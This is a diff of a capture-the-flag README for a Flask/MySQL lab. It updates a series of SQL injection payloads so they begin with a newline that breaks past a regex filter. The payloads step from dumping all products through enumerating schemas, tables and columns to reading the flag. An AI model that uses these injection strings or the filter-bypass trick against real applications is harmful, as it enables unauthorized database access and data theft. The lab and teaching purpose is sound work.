@@ -10,24 +10,24 @@ go to the mysql directory and run:
 
 ## exploit sqli
 
-one possibility to get the flag (as of now):
+one possibility to get the flag (as of now, you have to break the regex by using a "\n"):
 
 possible injection to display all products:
 
- ```%' or 'a'='a'; #```
+ ```\n%' or 'a'='a'; #```
 
 how to get database names:
 
-```%' or 'a'='a' union select group_concat(schema_name) from information_schema.schemata; #```
+```\n%' or 'a'='a' union select group_concat(schema_name) from information_schema.schemata; #```
 
 how to get table names:
 
-```%' or 'a'='a' union select group_concat(table_name) from information_schema.tables where table_schema='flask'; #```
+```\n%' or 'a'='a' union select group_concat(table_name) from information_schema.tables where table_schema='flask'; #```
 
 get column names of table 'flag':
 
-``` %' or 'a'='a' union select group_concat(column_name) from information_schema.columns where table_name='flag'; #```
+```\n%' or 'a'='a' union select group_concat(column_name) from information_schema.columns where table_name='flag'; #```
 
 get flag itself:
 
-```%' or 'a'='a' union select group_concat(flag) from flask.flag; #```
+```\n%' or 'a'='a' union select group_concat(flag) from flask.flag; #```
